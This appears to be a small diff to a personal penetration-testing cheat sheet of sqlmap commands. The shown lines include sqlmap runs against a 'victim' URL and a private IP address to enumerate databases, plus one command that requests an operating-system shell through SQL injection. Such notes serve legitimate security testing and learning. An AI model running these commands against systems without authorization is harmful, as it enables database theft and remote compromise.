@@ -557,6 +557,13 @@ sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --d
 
 # Intercepting the POST request with Burp, Running sqlmap with os-shell
 sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+
+
+sqlmap -u "http://192.168.225.48/" \
+  --data="mail-list=asdf@asdf.com" \
+  --method=POST \
+  --dbs \
+  --batch
 ~~~
 
 
